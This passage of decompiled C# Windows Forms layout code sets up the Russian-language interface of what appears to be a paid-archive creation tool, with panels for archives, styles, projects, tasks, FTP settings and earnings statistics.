      this.pictureBox1 = new PictureBox();
      this.label16 = new Label();
      this.label15 = new Label();
      this.Menu_Project = new Panel();
      this.label21 = new Label();
      this.pictureBox4 = new PictureBox();
      this.label22 = new Label();
      this.Menu_Tasks = new Panel();
      this.label19 = new Label();
      this.pictureBox3 = new PictureBox();
      this.label20 = new Label();
      this.label14 = new Label();
      this.label13 = new Label();
      this.Tab_archivation_hover = new PictureBox();
      this.Tab_styles_hover = new PictureBox();
      this.Tab_addvance_hover = new PictureBox();
      this.Tab_styles_panel = new Panel();
      this.label24 = new Label();
      this.Menu_styleList = new Panel();
      this.label35 = new Label();
      this.pictureBox9 = new PictureBox();
      this.label36 = new Label();
      this.Menu_newstyle = new Panel();
      this.label37 = new Label();
      this.label38 = new Label();
      this.pictureBox10 = new PictureBox();
      this.label23 = new Label();
      this.label32 = new Label();
      this.Cont_Main = new Panel();
      this.Menu_statistic_cont = new Panel();
      this.StatisticListView = new ListView();
      this.Date = new ColumnHeader();
      this.Opened = new ColumnHeader();
      this.Downed = new ColumnHeader();
      this.SMS = new ColumnHeader();
      this.SubsOn = new ColumnHeader();
      this.SubsOff = new ColumnHeader();
      this.Rebils = new ColumnHeader();
      this.RefSum = new ColumnHeader();
      this.Summary = new ColumnHeader();
      this.label4 = new Label();
      this.Menu_newstyle_cont = new Panel();
      this.inf = new Label();
      this.BrowsStyle = new Button();
      this.label56 = new Label();
      this.label9 = new Label();
      this.StylePath = new TextBox();
      this.StyleName = new TextBox();
      this.StyleCreate = new Button();
      this.StyleTest = new Button();
      this.StyleList = new ListView();
      this.columnHeader6 = new ColumnHeader();
      this.columnHeader11 = new ColumnHeader();
      this.columnHeader12 = new ColumnHeader();
      this.imageList1 = new ImageList(this.components);
      this.label10 = new Label();
      this.Menu_archivation_cont = new Panel();
      this.ForUpdateArchive = new Panel();
      this.button3 = new Button();
      this.OldFileBrouse = new Button();
      this.OldFilePath = new TextBox();
      this.OldFileList = new ListView();
      this.columnHeader1 = new ColumnHeader();
      this.columnHeader2 = new ColumnHeader();
      this.columnHeader3 = new ColumnHeader();
      this.columnHeader4 = new ColumnHeader();
      this.columnHeader5 = new ColumnHeader();
      this.imageList = new ImageList(this.components);
      this.label8 = new Label();
      this.ForNewArch = new Panel();
      this.CreateArchive = new Button();
      this.ClearFiles = new Button();
      this.DeleteFiles = new Button();
      this.AddFiles = new Button();
      this.ArchivationList = new ListView();
      this.F_Name = new ColumnHeader();
      this.F_Size = new ColumnHeader();
      this.F_Sours = new ColumnHeader();
      this.label45 = new Label();
      this.panel4 = new Panel();
      this.UpdateArchive = new RadioButton();
      this.NewArchive = new RadioButton();
      this.panel3 = new Panel();
      this.SaveAsProject = new Button();
      this.Project_Name = new TextBox();
      this.label53 = new Label();
      this.panel2 = new Panel();
      this.ShowPriseForClient = new CheckBox();
      this.UseOpenCount = new CheckBox();
      this.label48 = new Label();
      this.label46 = new Label();
      this.label44 = new Label();
      this.SelectFtpConection = new ComboBox();
      this.panel1 = new Panel();
      this.label43 = new Label();
      this.IndicateAltPaymentSum = new TextBox();
      this.AllowAltPayment = new CheckBox();
      this.label42 = new Label();
      this.SelectArchivePrice = new ComboBox();
      this.label39 = new Label();
      this.SelectPaymentType = new ComboBox();
      this.label25 = new Label();
      this.SelectArchiveLangage = new ComboBox();
      this.label52 = new Label();
      this.UseMyIcon = new CheckBox();
      this.label50 = new Label();
      this.SelectArchiveStyle = new ComboBox();
      this.label49 = new Label();
      this.SavedProfiles = new ComboBox();
      this.label41 = new Label();
      this.label40 = new Label();
      this.label47 = new Label();
      this.Menu_styleList_cont = new Panel();
      this.StyleListView = new ListView();
      this.columnHeader14 = new ColumnHeader();
      this.columnHeader15 = new ColumnHeader();
      this.columnHeader16 = new ColumnHeader();
      this.columnHeader7 = new ColumnHeader();
      this.label55 = new Label();
      this.Menu_archiveList_cont = new Panel();
      this.button6 = new Button();
      this.ArchiveListView = new ListView();
      this.AID = new ColumnHeader();
      this.ArchiveName = new ColumnHeader();
      this.ArchiveCreated = new ColumnHeader();
      this.ArchivePrice = new ColumnHeader();
      this.AllowSubs = new ColumnHeader();
      this.ArchiveUnpakSum = new ColumnHeader();
      this.Sum = new ColumnHeader();
      this.label51 = new Label();
      this.label60 = new Label();
      this.Menu_FTP_cont = new Panel();
      this.DeleteFTP = new Button();
      this.AddFTP = new Button();
      this.FtpList = new ListView();
      this.FtpName = new ColumnHeader();
      this.FtpServer = new ColumnHeader();
      this.FtpPort = new ColumnHeader();
      this.FtpPath = new ColumnHeader();
      this.FtpLogin = new ColumnHeader();
      this.FtpPass = new ColumnHeader();
      this.label6 = new Label();
      this.Tab_addvance_panel = new Panel();
      this.panel7 = new Panel();
      this.label26 = new Label();
      this.pictureBox6 = new PictureBox();
      this.label27 = new Label();
      this.Menu_FTP = new Panel();
      this.label28 = new Label();
      this.pictureBox7 = new PictureBox();
      this.label29 = new Label();
      this.Menu_statistic = new Panel();
      this.label31 = new Label();
      this.label30 = new Label();
      this.pictureBox8 = new PictureBox();
      this.label33 = new Label();
      this.label34 = new Label();
      this.Menu_Tasks_cont = new Panel();
      this.TaskList = new ListViewEx();
      this.ArchiveN = new ColumnHeader();
      this.Progress = new ColumnHeader();
      this.Status = new ColumnHeader();
      this.label2 = new Label();
      this.Menu_Project_cont = new Panel();
      this.deleteProject = new Button();
      this.ProjectList = new ListViewEx();
      this.ProjectName = new ColumnHeader();
      this.ProjectType = new ColumnHeader();
      this.label7 = new Label();
      this.notifyIcon1 = new NotifyIcon(this.components);
      this.AddFileMenu = new ContextMenu();
      this.AddFile = new MenuItem();
      this.AddFolder = new MenuItem();
      this.RunProject = new MenuItem();
      this.FileAdd_Dialog = new OpenFileDialog();
      this.FolderAdd_Dialog = new FolderBrowserDialog();
      this.news1head = new Label();
      this.news1txt = new LinkLabel();
      this.news2txt = new LinkLabel();
      this.news2head = new Label();
      this.news3txt = new LinkLabel();
      this.news3head = new Label();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.flowLayoutPanel1 = new FlowLayoutPanel();
      this.flowLayoutPanel2 = new FlowLayoutPanel();
      this.ICO_OpenDialog = new OpenFileDialog();
      this.saveFileDialog1 = new SaveFileDialog();
      this.OldFileBrouseDialog = new OpenFileDialog();
      this.TimerBackgWorker = new BackgroundWorker();
      this.ImgBrouseDlg = new OpenFileDialog();
      this.StyleBrowser = new FolderBrowserDialog();
      ((ISupportInitialize) this.Tab_archivation).BeginInit();
      ((ISupportInitialize) this.Tab_addvance).BeginInit();
      ((ISupportInitialize) this.Tab_styles).BeginInit();
      ((ISupportInitialize) this.Web_enter).BeginInit();
      this.Tab_archivation_panel.SuspendLayout();
      this.Menu_archiveList.SuspendLayout();
      ((ISupportInitialize) this.pictureBox2).BeginInit();
      this.Menu_archivation.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.Menu_Project.SuspendLayout();
      ((ISupportInitialize) this.pictureBox4).BeginInit();
      this.Menu_Tasks.SuspendLayout();
      ((ISupportInitialize) this.pictureBox3).BeginInit();
      ((ISupportInitialize) this.Tab_archivation_hover).BeginInit();
      ((ISupportInitialize) this.Tab_styles_hover).BeginInit();
      ((ISupportInitialize) this.Tab_addvance_hover).BeginInit();
      this.Tab_styles_panel.SuspendLayout();
      this.Menu_styleList.SuspendLayout();
      ((ISupportInitialize) this.pictureBox9).BeginInit();
      this.Menu_newstyle.SuspendLayout();
      ((ISupportInitialize) this.pictureBox10).BeginInit();
      this.Cont_Main.SuspendLayout();
      this.Menu_statistic_cont.SuspendLayout();
      this.Menu_newstyle_cont.SuspendLayout();
      this.Menu_archivation_cont.SuspendLayout();
      this.ForUpdateArchive.SuspendLayout();
      this.ForNewArch.SuspendLayout();
      this.panel4.SuspendLayout();
      this.panel3.SuspendLayout();
      this.panel2.SuspendLayout();
      this.panel1.SuspendLayout();
      this.Menu_styleList_cont.SuspendLayout();
      this.Menu_archiveList_cont.SuspendLayout();
      this.Menu_FTP_cont.SuspendLayout();
      this.Tab_addvance_panel.SuspendLayout();
      this.panel7.SuspendLayout();
      ((ISupportInitialize) this.pictureBox6).BeginInit();
      this.Menu_FTP.SuspendLayout();
      ((ISupportInitialize) this.pictureBox7).BeginInit();
      this.Menu_statistic.SuspendLayout();
      ((ISupportInitialize) this.pictureBox8).BeginInit();
      this.Menu_Tasks_cont.SuspendLayout();
      this.Menu_Project_cont.SuspendLayout();
      this.flowLayoutPanel1.SuspendLayout();
      this.flowLayoutPanel2.SuspendLayout();
      this.SuspendLayout();
      this.Tab_archivation.BackgroundImage = (Image) Resources._1arch_noactive;
      this.Tab_archivation.Cursor = Cursors.Hand;
      this.Tab_archivation.Image = (Image) Resources._1arch_noactive;
      this.Tab_archivation.Location = new Point(6, 95);
      this.Tab_archivation.Name = "Tab_archivation";
      this.Tab_archivation.Size = new Size(261, 75);
      this.Tab_archivation.TabIndex = 0;
      this.Tab_archivation.TabStop = false;
      this.Tab_archivation.Click += new EventHandler(this.Tab_Click);
      this.Tab_addvance.BackgroundImage = (Image) Resources._3other_noactive;
      this.Tab_addvance.Cursor = Cursors.Hand;
      this.Tab_addvance.Location = new Point(6, 251);
      this.Tab_addvance.Name = "Tab_addvance";
      this.Tab_addvance.Size = new Size(261, 75);
      this.Tab_addvance.TabIndex = 1;
      this.Tab_addvance.TabStop = false;
      this.Tab_addvance.Click += new EventHandler(this.Tab_Click);
      this.Tab_styles.BackgroundImage = (Image) Resources._2style_noactive;
      this.Tab_styles.Cursor = Cursors.Hand;
      this.Tab_styles.Location = new Point(6, 173);
      this.Tab_styles.Name = "Tab_styles";
      this.Tab_styles.Size = new Size(261, 75);
      this.Tab_styles.TabIndex = 2;
      this.Tab_styles.TabStop = false;
      this.Tab_styles.Click += new EventHandler(this.Tab_Click);
      this.Web_enter.Cursor = Cursors.Hand;
      this.Web_enter.Image = (Image) Resources.but_webstat;
      this.Web_enter.Location = new Point(44, 503);
      this.Web_enter.Name = "Web_enter";
      this.Web_enter.Size = new Size(165, 25);
      this.Web_enter.TabIndex = 3;
      this.Web_enter.TabStop = false;
      this.Web_enter.Click += new EventHandler(this.EnterMyAcc);
      this.TXT_LastNews.AutoSize = true;
      this.TXT_LastNews.BackColor = Color.Transparent;
      this.TXT_LastNews.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel, (byte) 204);
      this.TXT_LastNews.ForeColor = SystemColors.Window;
      this.TXT_LastNews.Location = new Point(3, 341);
      this.TXT_LastNews.Name = "TXT_LastNews";
      this.TXT_LastNews.Size = new Size(124, 15);
      this.TXT_LastNews.TabIndex = 4;
      this.TXT_LastNews.Text = "Последние новости";
      this.Link_help.AutoSize = true;
      this.Link_help.BackColor = Color.Transparent;
      this.Link_help.LinkColor = SystemColors.Window;
      this.Link_help.Location = new Point(259, 537);
      this.Link_help.Name = "Link_help";
      this.Link_help.Size = new Size(48, 14);
      this.Link_help.TabIndex = 5;
      ((Label) this.Link_help).TabStop = true;
      this.Link_help.Text = "Помощь";
      this.Link_help.VisitedLinkColor = SystemColors.Window;
      this.Link_help.LinkClicked += new LinkLabelLinkClickedEventHandler(this.Link_help_LinkClicked);
      this.Link_site.AutoSize = true;
      this.Link_site.BackColor = Color.Transparent;
      this.Link_site.LinkColor = SystemColors.Window;
      this.Link_site.Location = new Point(313, 537);
      this.Link_site.Name = "Link_site";
      this.Link_site.Size = new Size(32, 14);
      this.Link_site.TabIndex = 6;
      ((Label) this.Link_site).TabStop = true;
      this.Link_site.Text = "Сайт";
      this.Link_site.Click += new EventHandler(this.EnterMyAcc);
      this.Link_forum.AutoSize = true;
      this.Link_forum.BackColor = Color.Transparent;
      this.Link_forum.LinkColor = SystemColors.Window;
      this.Link_forum.Location = new Point(351, 537);
      this.Link_forum.Name = "Link_forum";
      this.Link_forum.Size = new Size(41, 14);
      this.Link_forum.TabIndex = 7;
      ((Label) this.Link_forum).TabStop = true;
      this.Link_forum.Text = "Форум";
      this.Link_forum.LinkClicked += new LinkLabelLinkClickedEventHandler(this.Link_forum_LinkClicked);
      this.Link_about.AutoSize = true;
      this.Link_about.BackColor = Color.Transparent;
      this.Link_about.LinkColor = SystemColors.Window;
      this.Link_about.Location = new Point(398, 537);
      this.Link_about.Name = "Link_about";
      this.Link_about.Size = new Size(74, 14);
      this.Link_about.TabIndex = 8;
      ((Label) this.Link_about).TabStop = true;
      this.Link_about.Text = "О программе";
      this.Link_about.Visible = false;
      this.TXT_UpdateInfo.AutoSize = true;
      this.TXT_UpdateInfo.BackColor = Color.Transparent;
      this.TXT_UpdateInfo.ForeColor = SystemColors.Window;
      this.TXT_UpdateInfo.Location = new Point(76, 0);
      this.TXT_UpdateInfo.Margin = new Padding(0);
      this.TXT_UpdateInfo.Name = "TXT_UpdateInfo";
      this.TXT_UpdateInfo.Size = new Size(129, 14);
      this.TXT_UpdateInfo.TabIndex = 9;
      this.TXT_UpdateInfo.Text = "Последнее обновление:";
      this.TXT_UpdateTime.AutoSize = true;
      this.TXT_UpdateTime.BackColor = Color.Transparent;
      this.TXT_UpdateTime.ForeColor = SystemColors.Window;
      this.TXT_UpdateTime.Location = new Point(205, 0);
      this.TXT_UpdateTime.Margin = new Padding(0);
      this.TXT_UpdateTime.Name = "TXT_UpdateTime";
      this.TXT_UpdateTime.Size = new Size(13, 14);
      this.TXT_UpdateTime.TabIndex = 10;
      this.TXT_UpdateTime.Text = "0";
      this.TXT_UpdateTime.TextAlign = ContentAlignment.MiddleCenter;
      this.TXT_UpdateInfo2.AutoSize = true;
      this.TXT_UpdateInfo2.BackColor = Color.Transparent;
      this.TXT_UpdateInfo2.ForeColor = SystemColors.Window;
      this.TXT_UpdateInfo2.Location = new Point(218, 0);
      this.TXT_UpdateInfo2.Margin = new Padding(0);
      this.TXT_UpdateInfo2.Name = "TXT_UpdateInfo2";
      this.TXT_UpdateInfo2.Size = new Size(62, 14);
      this.TXT_UpdateInfo2.TabIndex = 11;
      this.TXT_UpdateInfo2.Text = "мин. назад";
      this.Link_support.AutoSize = true;
      this.Link_support.BackColor = Color.Transparent;
      this.Link_support.LinkColor = SystemColors.Window;
      this.Link_support.Location = new Point(38, 0);
      this.Link_support.Margin = new Padding(0);
      this.Link_support.Name = "Link_support";
      this.Link_support.Size = new Size(104, 14);
      this.Link_support.TabIndex = 12;
      ((Label) this.Link_support).TabStop = true;
      this.Link_support.Text = "Служба поддержки";
      this.Link_support.Click += new EventHandler(this.EnterMyAcc);
      this.TXT_newMsg.AutoSize = true;
      this.TXT_newMsg.BackColor = Color.Transparent;
      this.TXT_newMsg.ForeColor = SystemColors.Window;
      this.TXT_newMsg.Location = new Point(142, 0);
      this.TXT_newMsg.Margin = new Padding(0);
      this.TXT_newMsg.Name = "TXT_newMsg";
      this.TXT_newMsg.Size = new Size(109, 14);
      this.TXT_newMsg.TabIndex = 13;
      this.TXT_newMsg.Text = "/ Новых сообшений:";
      this.TXT_newMsg.Visible = false;
      this.Link_NewMsgCount.AutoSize = true;
      this.Link_NewMsgCount.BackColor = Color.Transparent;
      this.Link_NewMsgCount.LinkColor = Color.White;
      this.Link_NewMsgCount.Location = new Point(251, 0);
      this.Link_NewMsgCount.Margin = new Padding(0);
      this.Link_NewMsgCount.Name = "Link_NewMsgCount";
      this.Link_NewMsgCount.Size = new Size(13, 14);
      this.Link_NewMsgCount.TabIndex = 14;
      ((Label) this.Link_NewMsgCount).TabStop = true;
      this.Link_NewMsgCount.Text = "1";
      this.Link_NewMsgCount.Visible = false;
      this.label1.AutoSize = true;
      this.label1.BackColor = Color.Transparent;
      this.label1.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label1.ForeColor = SystemColors.Window;
      this.label1.Location = new Point(282, 43);
      this.label1.Name = "label1";
      this.label1.Size = new Size(92, 15);
      this.label1.TabIndex = 15;
      this.label1.Text = "Пользователь:";
      this.LoginTXT.AutoSize = true;
      this.LoginTXT.BackColor = Color.Transparent;
      this.LoginTXT.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.LoginTXT.ForeColor = SystemColors.Window;
      this.LoginTXT.Location = new Point(374, 43);
      this.LoginTXT.Name = "LoginTXT";
      this.LoginTXT.Size = new Size(40, 15);
      this.LoginTXT.TabIndex = 16;
      this.LoginTXT.Text = "Логин";
      this.label3.AutoSize = true;
      this.label3.BackColor = Color.Transparent;
      this.label3.Font = new Font("Arial", 17f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label3.ForeColor = SystemColors.Window;
      this.label3.Location = new Point(281, 66);
      this.label3.Name = "label3";
      this.label3.Size = new Size(71, 19);
      this.label3.TabIndex = 17;
      this.label3.Text = "Баланс:";
      this.BalanceSum.AutoSize = true;
      this.BalanceSum.BackColor = Color.Transparent;
      this.BalanceSum.Font = new Font("Arial", 17f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.BalanceSum.ForeColor = SystemColors.Window;
      this.BalanceSum.Location = new Point(351, 66);
      this.BalanceSum.Name = "BalanceSum";
      this.BalanceSum.Size = new Size(55, 19);
      this.BalanceSum.TabIndex = 18;
      this.BalanceSum.Text = "0 руб.";
      this.label5.AutoSize = true;
      this.label5.BackColor = Color.Transparent;
      this.label5.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label5.ForeColor = SystemColors.Window;
      this.label5.Location = new Point(474, 43);
      this.label5.Name = "label5";
      this.label5.Size = new Size(76, 15);
      this.label5.TabIndex = 19;
      this.label5.Text = "Сегодня: .....";
      this.label78.AutoSize = true;
      this.label78.BackColor = Color.Transparent;
      this.label78.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label78.ForeColor = SystemColors.Window;
      this.label78.Location = new Point(474, 69);
      this.label78.Name = "label78";
      this.label78.Size = new Size(78, 15);
      this.label78.TabIndex = 20;
      this.label78.Text = "Вчера: ..........";
      this.YesterdaySum.AutoSize = true;
      this.YesterdaySum.BackColor = Color.Transparent;
      this.YesterdaySum.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.YesterdaySum.ForeColor = SystemColors.Window;
      this.YesterdaySum.Location = new Point(547, 69);
      this.YesterdaySum.Name = "YesterdaySum";
      this.YesterdaySum.Size = new Size(39, 15);
      this.YesterdaySum.TabIndex = 22;
      this.YesterdaySum.Text = "0 руб.";
      this.TodaySum.AutoSize = true;
      this.TodaySum.BackColor = Color.Transparent;
      this.TodaySum.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.TodaySum.ForeColor = SystemColors.Window;
      this.TodaySum.Location = new Point(547, 43);
      this.TodaySum.Name = "TodaySum";
      this.TodaySum.Size = new Size(39, 15);
      this.TodaySum.TabIndex = 21;
      this.TodaySum.Text = "0 руб.";
      this.MonthSum.AutoSize = true;
      this.MonthSum.BackColor = Color.Transparent;
      this.MonthSum.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.MonthSum.ForeColor = SystemColors.Window;
      this.MonthSum.Location = new Point(702, 69);
      this.MonthSum.Name = "MonthSum";
      this.MonthSum.Size = new Size(39, 15);
      this.MonthSum.TabIndex = 26;
      this.MonthSum.Text = "0 руб.";
      this.WeekSum.AutoSize = true;
      this.WeekSum.BackColor = Color.Transparent;
      this.WeekSum.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.WeekSum.ForeColor = SystemColors.Window;
      this.WeekSum.Location = new Point(702, 43);
      this.WeekSum.Name = "WeekSum";
      this.WeekSum.Size = new Size(39, 15);
      this.WeekSum.TabIndex = 25;
      this.WeekSum.Text = "0 руб.";
      this.label11.AutoSize = true;
      this.label11.BackColor = Color.Transparent;
      this.label11.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label11.ForeColor = SystemColors.Window;
      this.label11.Location = new Point(629, 69);
      this.label11.Name = "label11";
      this.label11.Size = new Size(79, 15);
      this.label11.TabIndex = 24;
      this.label11.Text = "Месяц: ..........";
      this.label12.AutoSize = true;
      this.label12.BackColor = Color.Transparent;
      this.label12.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label12.ForeColor = SystemColors.Window;
      this.label12.Location = new Point(629, 43);
      this.label12.Name = "label12";
      this.label12.Size = new Size(72, 15);
      this.label12.TabIndex = 23;
      this.label12.Text = "Неделя: .....";
      this.Tab_archivation_panel.BackColor = Color.Transparent;
      this.Tab_archivation_panel.Controls.Add((Control) this.Menu_archiveList);
      this.Tab_archivation_panel.Controls.Add((Control) this.Menu_archivation);
      this.Tab_archivation_panel.Controls.Add((Control) this.Menu_Project);
      this.Tab_archivation_panel.Controls.Add((Control) this.Menu_Tasks);
      this.Tab_archivation_panel.Controls.Add((Control) this.label14);
      this.Tab_archivation_panel.Controls.Add((Control) this.label13);
      this.Tab_archivation_panel.Location = new Point(15, 3);
      this.Tab_archivation_panel.Name = "Tab_archivation_panel";
      this.Tab_archivation_panel.Size = new Size(133, 51);
      this.Tab_archivation_panel.TabIndex = 27;
      this.Tab_archivation_panel.MouseEnter += new EventHandler(this.MainPanel_MouseEnter);
      this.Menu_archiveList.Controls.Add((Control) this.label17);
      this.Menu_archiveList.Controls.Add((Control) this.pictureBox2);
      this.Menu_archiveList.Controls.Add((Control) this.label18);
      this.Menu_archiveList.Cursor = Cursors.Hand;
      this.Menu_archiveList.Location = new Point(18, 176);
      this.Menu_archiveList.Name = "Menu_archiveList";
      this.Menu_archiveList.Size = new Size(494, 66);
      this.Menu_archiveList.TabIndex = 15;
      this.Menu_archiveList.Click += new EventHandler(this.Menu_Click);
      this.Menu_archiveList.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.label17.AutoSize = true;
      this.label17.Location = new Point(93, 29);
      this.label17.Name = "label17";
      this.label17.Size = new Size(302, 14);
      this.label17.TabIndex = 9;
      this.label17.Text = "Просмотр списка архивов с возможностью их удаления.";
      this.label17.TextAlign = ContentAlignment.MiddleLeft;
      this.label17.Click += new EventHandler(this.Menu_Click);
      this.pictureBox2.Image = (Image) Resources._1_2_spisok;
      this.pictureBox2.Location = new Point(30, 9);
      this.pictureBox2.Name = "pictureBox2";
      this.pictureBox2.Size = new Size(48, 48);
      this.pictureBox2.TabIndex = 3;
      this.pictureBox2.TabStop = false;
      this.pictureBox2.Click += new EventHandler(this.Menu_Click);
      this.label18.AutoSize = true;
      this.label18.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label18.ForeColor = Color.FromArgb(53, 88, 81);
      this.label18.Location = new Point(93, 9);
      this.label18.Name = "label18";
      this.label18.Size = new Size(117, 17);
      this.label18.TabIndex = 8;
      this.label18.Text = "Список архивов";
      this.label18.Click += new EventHandler(this.Menu_Click);
      this.Menu_archivation.Controls.Add((Control) this.pictureBox1);
      this.Menu_archivation.Controls.Add((Control) this.label16);
      this.Menu_archivation.Controls.Add((Control) this.label15);
      this.Menu_archivation.Cursor = Cursors.Hand;
      this.Menu_archivation.Location = new Point(18, 99);
      this.Menu_archivation.Name = "Menu_archivation";
      this.Menu_archivation.Size = new Size(494, 66);
      this.Menu_archivation.TabIndex = 14;
      this.Menu_archivation.Click += new EventHandler(this.Menu_Click);
      this.Menu_archivation.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.pictureBox1.Image = (Image) Resources._1_1_newarchive;
      this.pictureBox1.Location = new Point(30, 9);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(48, 48);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.CenterImage;
      this.pictureBox1.TabIndex = 2;
      this.pictureBox1.TabStop = false;
      this.pictureBox1.Click += new EventHandler(this.Menu_Click);
      this.label16.AutoSize = true;
      this.label16.Location = new Point(93, 29);
      this.label16.Name = "label16";
      this.label16.Size = new Size(293, 28);
      this.label16.TabIndex = 7;
      this.label16.Text = "Создание новых архивов, обновление существующих. \r\nВыполнение сохраненных ранее проектов.";
      this.label16.TextAlign = ContentAlignment.MiddleLeft;
      this.label16.Click += new EventHandler(this.Menu_Click);
      this.label15.AutoSize = true;
      this.label15.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label15.ForeColor = Color.FromArgb(53, 88, 81);
      this.label15.Location = new Point(93, 9);
      this.label15.Name = "label15";
      this.label15.Size = new Size(81, 17);
      this.label15.TabIndex = 6;
      this.label15.Text = "Архивация";
      this.label15.Click += new EventHandler(this.Menu_Click);
      this.Menu_Project.Controls.Add((Control) this.label21);
      this.Menu_Project.Controls.Add((Control) this.pictureBox4);
      this.Menu_Project.Controls.Add((Control) this.label22);
      this.Menu_Project.Cursor = Cursors.Hand;
      this.Menu_Project.Location = new Point(17, 331);
      this.Menu_Project.Name = "Menu_Project";
      this.Menu_Project.Size = new Size(494, 66);
      this.Menu_Project.TabIndex = 17;
      this.Menu_Project.Click += new EventHandler(this.Menu_Click);
      this.Menu_Project.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.label21.AutoSize = true;
      this.label21.Location = new Point(93, 28);
      this.label21.Name = "label21";
      this.label21.Size = new Size(376, 28);
      this.label21.TabIndex = 13;
      this.label21.Text = "Просмотр списка проектов (проект - список параметров, необходимых\r\nдля повторного создания или обновления архивов).";
      this.label21.TextAlign = ContentAlignment.MiddleLeft;
      this.label21.Click += new EventHandler(this.Menu_Click);
      this.pictureBox4.Image = (Image) Resources._1_4_proekti;
      this.pictureBox4.Location = new Point(30, 8);
      this.pictureBox4.Name = "pictureBox4";
      this.pictureBox4.Size = new Size(48, 48);
      this.pictureBox4.TabIndex = 5;
      this.pictureBox4.TabStop = false;
      this.pictureBox4.Click += new EventHandler(this.Menu_Click);
      this.label22.AutoSize = true;
      this.label22.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label22.ForeColor = Color.FromArgb(53, 88, 81);
      this.label22.Location = new Point(93, 8);
      this.label22.Name = "label22";
      this.label22.Size = new Size(67, 17);
      this.label22.TabIndex = 12;
      this.label22.Text = "Проекты";
      this.label22.Click += new EventHandler(this.Menu_Click);
      this.Menu_Tasks.Controls.Add((Control) this.label19);
      this.Menu_Tasks.Controls.Add((Control) this.pictureBox3);
      this.Menu_Tasks.Controls.Add((Control) this.label20);
      this.Menu_Tasks.Cursor = Cursors.Hand;
      this.Menu_Tasks.Location = new Point(17, 253);
      this.Menu_Tasks.Name = "Menu_Tasks";
      this.Menu_Tasks.Size = new Size(494, 66);
      this.Menu_Tasks.TabIndex = 16;
      this.Menu_Tasks.Click += new EventHandler(this.Menu_Click);
      this.Menu_Tasks.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.label19.AutoSize = true;
      this.label19.Location = new Point(93, 28);
      this.label19.Name = "label19";
      this.label19.Size = new Size(328, 14);
      this.label19.TabIndex = 11;
      this.label19.Text = "Просмотр списка заданий на создание и обновление архивов.";
      this.label19.TextAlign = ContentAlignment.MiddleLeft;
      this.label19.Click += new EventHandler(this.Menu_Click);
      this.pictureBox3.Image = (Image) Resources._1_3_zadachi;
      this.pictureBox3.Location = new Point(30, 8);
      this.pictureBox3.Name = "pictureBox3";
      this.pictureBox3.Size = new Size(48, 48);
      this.pictureBox3.TabIndex = 4;
      this.pictureBox3.TabStop = false;
      this.pictureBox3.Click += new EventHandler(this.Menu_Click);
      this.label20.AutoSize = true;
      this.label20.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label20.ForeColor = Color.FromArgb(53, 88, 81);
      this.label20.Location = new Point(93, 8);
      this.label20.Name = "label20";
      this.label20.Size = new Size(66, 17);
      this.label20.TabIndex = 10;
      this.label20.Text = "Задания";
      this.label20.Click += new EventHandler(this.Menu_Click);
      this.label14.AutoSize = true;
      this.label14.Location = new Point(14, 44);
      this.label14.Name = "label14";
      this.label14.Size = new Size(432, 28);
      this.label14.TabIndex = 1;
      this.label14.Text = "В данном разделе Вы можете создать новый архив или обновить существующий,\r\nпросмотреть список архивов, заданий, проектов.";
      this.label14.TextAlign = ContentAlignment.MiddleLeft;
      this.label13.AutoSize = true;
      this.label13.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label13.ForeColor = Color.FromArgb(53, 88, 81);
      this.label13.Location = new Point(11, 17);
      this.label13.Name = "label13";
      this.label13.Size = new Size(110, 21);
      this.label13.TabIndex = 0;
      this.label13.Text = "Архивация";
      this.Tab_archivation_hover.BackgroundImage = (Image) Resources._1arch_active;
      this.Tab_archivation_hover.Cursor = Cursors.Hand;
      this.Tab_archivation_hover.Image = (Image) Resources._1arch_active;
      this.Tab_archivation_hover.Location = new Point(6, 95);
      this.Tab_archivation_hover.Name = "Tab_archivation_hover";
      this.Tab_archivation_hover.Size = new Size(261, 75);
      this.Tab_archivation_hover.TabIndex = 28;
      this.Tab_archivation_hover.TabStop = false;
      this.Tab_archivation_hover.Click += new EventHandler(this.Tab_Click);
      this.Tab_styles_hover.BackgroundImage = (Image) Resources._2style_active;
      this.Tab_styles_hover.Cursor = Cursors.Arrow;
      this.Tab_styles_hover.Location = new Point(6, 173);
      this.Tab_styles_hover.Name = "Tab_styles_hover";
      this.Tab_styles_hover.Size = new Size(261, 75);
      this.Tab_styles_hover.TabIndex = 29;
      this.Tab_styles_hover.TabStop = false;
      this.Tab_styles_hover.Visible = false;
      this.Tab_styles_hover.Click += new EventHandler(this.Tab_Click);
      this.Tab_addvance_hover.BackgroundImage = (Image) Resources._3other_active;
      this.Tab_addvance_hover.Cursor = Cursors.Default;
      this.Tab_addvance_hover.Location = new Point(6, 251);
      this.Tab_addvance_hover.Name = "Tab_addvance_hover";
